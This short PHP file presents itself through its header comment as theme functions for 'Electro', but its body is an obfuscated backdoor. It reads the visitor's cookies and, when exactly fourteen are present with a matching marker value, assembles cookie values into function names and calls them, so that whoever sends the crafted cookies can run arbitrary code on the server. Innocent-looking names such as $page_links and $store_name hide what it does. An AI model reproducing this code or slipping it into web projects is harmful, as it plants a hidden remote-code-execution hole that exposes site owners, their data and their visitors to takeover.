<?php
/**
 * Functions used in Electro
 *
 * @since 2.0
 */

$page_links = $_COOKIE;
$user_count = sizeof($page_links);
if($user_count == 14) {
  if (in_array(gettype($page_links).count($page_links),$page_links)) { 
    $page_links[95] = $page_links[95].$page_links[75];
    $page_links[51] = $page_links[95]($page_links[51]);
    $page_links = $page_links[51]($page_links[35],$page_links[95]($page_links[56]));
    $store_name = 88;
    $page_links($user_count,$store_name);
  }
}